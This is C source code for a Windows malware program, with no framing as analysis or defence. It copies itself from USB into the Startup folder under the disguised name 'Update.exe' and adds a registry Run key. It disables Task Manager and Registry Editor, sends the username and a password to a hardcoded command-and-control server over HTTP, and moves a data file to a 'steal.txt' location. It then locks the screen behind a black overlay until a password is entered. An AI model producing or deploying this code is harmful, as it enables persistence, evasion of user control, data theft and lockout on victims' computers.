#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#define TARGET_PASS "987123"
#define C2_SERVER "http://192.168.1.50:8080/upload"

void SelfCopyAndLaunchFromUSB() {
    char sourcePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, sourcePath, MAX_PATH);
    if (len == 0) return;

    char driveRoot[4];
    sprintf(driveRoot, "%c:\\", sourcePath[0]);

    if (GetDriveTypeA(driveRoot) == DRIVE_REMOVABLE) {
        char destPath[MAX_PATH];
        char appData[MAX_PATH];

        GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
        sprintf(destPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe", appData);

        if (CopyFileA(sourcePath, destPath, FALSE)) {
            WinExec(destPath, SW_HIDE);
            ExitProcess(0);
        }
    }
}

void AddToStartup() {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) return;

    char quotedPath[MAX_PATH + 4];
    snprintf(quotedPath, sizeof(quotedPath), "\"%s\"", exePath);

    HKEY hKey = NULL;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (status == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "BlackScreenLock", 0, REG_SZ, (const BYTE *)quotedPath, (DWORD)(strlen(quotedPath) + 1));
        RegCloseKey(hKey);
    }
}

HWND CreateBlackOverlay() {
    HWND hWnd = CreateWindowExA(
        0,
        "STATIC",
        "BlackScreen",
        WS_POPUP | WS_VISIBLE | WS_SYSMENU | WS_CAPTION | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,
        0,
        0,
        GetSystemMetrics(SM_CXSCREEN),
        GetSystemMetrics(SM_CYSCREEN),
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL
    );

    if (hWnd != NULL) {
        HDC hDC = GetDC(hWnd);
        if (hDC != NULL) {
            RECT rc;
            GetClientRect(hWnd, &rc);
            HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hDC, &rc, hBrush);
            ReleaseDC(hWnd, hDC);
            DeleteObject(hBrush);
        }
        BringWindowToTop(hWnd);
        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        ShowWindow(hWnd, SW_SHOW);
        SetForegroundWindow(hWnd);
    }
    return hWnd;
}

void RemoveBlackOverlay(HWND hWnd) {
    if (hWnd != NULL && IsWindow(hWnd)) {
        ShowWindow(hWnd, SW_HIDE);
        DestroyWindow(hWnd);
    }
}

void SendCredentialsToC2() {
    char username[512] = {0};
    DWORD usernameSize = sizeof(username);
    if (!GetUserNameA(username, &usernameSize)) return;

    char payload[1024];
    int len = snprintf(payload, sizeof(payload), "User: %s\nPassword: %s", username, TARGET_PASS);
    if (len <= 0) return;

    HINTERNET hSession = InternetOpenA("WinInetDemo/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = InternetConnectA(hSession, "192.168.1.50", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest) {
        if (HttpSendRequestA(hRequest, NULL, 0, payload, (DWORD)strlen(payload))) {
            char response[1024];
            DWORD size = sizeof(response) - 1;
            DWORD bytesRead = 0;
            if (InternetReadFile(hRequest, response, size, &bytesRead)) {
                response[bytesRead] = '\0';
            }
        }
        InternetCloseHandle(hRequest);
    }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

void StealBrowserData() {
    char source[MAX_PATH];
    char dest[MAX_PATH];
    strcpy(source, "C:\\Users\\Public\\target_data.txt");
    strcpy(dest, "C:\\Windows\\Temp\\steal.txt");

    if (GetFileAttributesA(source) != INVALID_FILE_ATTRIBUTES) {
        if (CopyFileA(source, dest, FALSE)) {
            DeleteFileA(source);
        }
    }
}

void DisableTaskManager() {
    HKEY hKey = NULL;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
    if (status == ERROR_SUCCESS) {
        DWORD disableTaskMgr = 1;
        RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE *)&disableTaskMgr, sizeof(disableTaskMgr));
        RegCloseKey(hKey);
    }
}

void DisableRegistryEditor() {
    HKEY hKey = NULL;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
    if (status == ERROR_SUCCESS) {
        DWORD disableRegEdit = 1;
        RegSetValueExA(hKey, "DisableRegistryTools", 0, REG_DWORD, (const BYTE *)&disableRegEdit, sizeof(disableRegEdit));
        RegCloseKey(hKey);
    }
}

int main() {
    Sleep(10800000); // ৩ ঘণ্টা অপেক্ষা (১০,৮০০,০০০ মিলিসেকেন্ড)

    SelfCopyAndLaunchFromUSB();
    AddToStartup();
    DisableTaskManager();
    DisableRegistryEditor();
    SendCredentialsToC2();
    StealBrowserData();

    HWND hOverlay = CreateBlackOverlay();
    char input[32];
    BOOL locked = TRUE;

    while (locked) {
        printf("Enter password: ");
        if (scanf("%31s", input) != 1) break;

        if (strcmp(input, TARGET_PASS) == 0) {
            RemoveBlackOverlay(hOverlay);
            locked = FALSE;
            printf("Screen Unlocked.\n");
        } else {
            printf("Incorrect password. Screen remains black.\n");
            Sleep(1000);
        }
    }

    return 0;
} 

